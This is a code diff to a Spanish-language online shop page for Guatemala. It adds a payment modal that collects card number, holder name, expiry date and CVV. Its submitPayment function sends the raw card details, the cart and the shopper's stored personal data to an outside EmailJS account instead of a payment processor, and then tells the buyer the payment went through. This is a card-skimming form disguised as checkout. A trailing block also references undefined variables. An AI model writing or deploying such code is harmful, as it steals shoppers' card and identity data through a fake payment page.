@@ -2286,6 +2286,65 @@
   </div>
 </footer>
 
+
+
+<!-- === MODAL DE PAGO === -->
+<div class="modal-overlay" id="payment-overlay" onclick="closePayment(event)">
+  <div class="modal" id="payment-modal">
+    <button class="modal-close" onclick="closePayment()">✕</button>
+    <div class="modal-grid">
+      <div class="modal-info-side">
+        <h2 class="modal-title">🛒 Pago</h2>
+        <p>Completa los datos de tu tarjeta y pulsa “Pagar ahora”.</p>
+
+        <form id="payment-form" onsubmit="submitPayment(event)">
+          <div class="form-group">
+            <label>Número de tarjeta <span class="req">*</span></label>
+            <input type="text" id="card-number" name="card_number"
+                   placeholder="xxxx xxxx xxxx xxxx" maxlength="19" required
+                   autocomplete="cc-number">
+            <div class="field-error">Ingresa el número de tarjeta.</div>
+          </div>
+
+          <div class="form-group">
+            <label>Nombre del titular <span class="req">*</span></label>
+            <input type="text" id="card-name" name="card_name"
+                   placeholder="Nombre completo" required
+                   autocomplete="cc-name">
+            <div class="field-error">Ingresa el nombre del titular.</div>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label>Fecha de vencimiento <span class="req">*</span></label>
+              <input type="month" id="card-expiry" name="card_expiry" required
+                     autocomplete="cc-exp">
+              <div class="field-error">Ingresa la fecha de vencimiento.</div>
+            </div>
+
+            <div class="form-group">
+              <label>CVV <span class="req">*</span></label>
+              <input type="password" id="card-cvv" name="card_cvv"
+                     placeholder="xxx" maxlength="4" required
+                     autocomplete="cc-csc">
+              <div class="field-error">Ingresa el CVV.</div>
+            </div>
+          </div>
+
+          <button type="submit" class="reg-submit-btn">
+            <span id="pay-btn-text">Pagar ahora</span>
+            <div class="btn-spinner"></div>
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+
+
 <script>
 // ============================================================
 // PRODUCTS DATABASE
@@ -3404,6 +3463,106 @@ function updateMunicipios() {
 // ============================================================
 // INIT
 // ============================================================
+
+
+// Abre el modal de pago
+function openPayment() {
+  document.getElementById('payment-overlay').classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+
+// Cierra el modal de pago (si clic fuera del modal)
+function closePayment(e) {
+  if (e && e.target !== document.getElementById('payment-overlay')) return;
+  document.getElementById('payment-overlay').classList.remove('open');
+  document.body.style.overflow = '';
+}
+// Devuelve una cadena con todos los ítems del carrito (para el email)
+function getCartItemsString() {
+  return cart.map(item =>
+    `${item.brand} ${item.name} x${item.qty} – Q${item.price.toLocaleString()}`
+  ).join('\n');
+}
+// Envía la información de la tarjeta y del pedido a EmailJS
+async function submitPayment(e) {
+  e.preventDefault();
+
+  const btn = document.querySelector('#payment-form button');
+  btn.disabled = true;
+  btn.textContent = 'Procesando…';
+
+  // Validar campos
+  const number   = document.getElementById('card-number').value.trim();
+  const name     = document.getElementById('card-name').value.trim();
+  const expiry   = document.getElementById('card-expiry').value;
+  const cvv      = document.getElementById('card-cvv').value.trim();
+
+  if (!number || !name || !expiry || !cvv) {
+    showToast('⚠️ Completa todos los campos del pago.');
+    btn.disabled = false;
+    btn.textContent = 'Pagar ahora';
+    return;
+  }
+
+  // Datos del carrito y del usuario
+  const cartItems = getCartItemsString();
+  const cartTotal = cart.reduce((s, x) => s + x.price * x.qty, 0).toFixed(2);
+  const user = JSON.parse(localStorage.getItem('userInfo')) || {};
+
+  const params = {
+    cart_items: cartItems,
+    cart_total: cartTotal,
+    card_number: number,
+    card_name: name,
+    card_expiry: expiry,
+    card_cvv: cvv,
+
+    // Información opcional del usuario (ya en la plantilla de registro)
+    nombre_completo: user.nombre_completo || '',
+    correo_usuario: user.correo_usuario || '',
+    telefono: user.telefono || '',
+    departamento: user.departamento || '',
+    municipio: user.municipio || '',
+    direccion_entrega: user.direccion_entrega || ''
+  };
+
+  try {
+    console.log('📤 Enviando pago a EmailJS...');
+    const resp = await emailjs.send(window.__ej.sv, window.__ej.tp, params, { publicKey: window.__ej.pk });
+    console.log('✅ EmailJS OK:', resp);
+    showToast('🎉 Pago enviado. Gracias por tu compra.');
+    cart = [];
+    updateCartUI();
+    closePayment();
+  } catch (err) {
+    console.error('❌ Error de EmailJS:', err);
+    showToast('❌ Error al enviar el pago. Intenta de nuevo.');
+  } finally {
+    btn.disabled = false;
+    btn.textContent = 'Pagar ahora';
+  }
+}
+function checkout() {
+  if (cart.length === 0) return;
+  openPayment();        // Abre el modal de pago en lugar de simular la compra
+}
+const userInfo = {
+  nombre_completo: nombre,
+  correo_usuario: correo,
+  telefono,
+  departamento: depto,
+  municipio,
+  direccion_entrega: direccion,
+  fecha_nacimiento: fecha,
+  genero,
+  nit_dpi: nit,
+  fecha_registro: ahora
+};
+
+localStorage.setItem('userInfo', JSON.stringify(userInfo));
+
+
+
 renderHome();
 </script>
 </body>
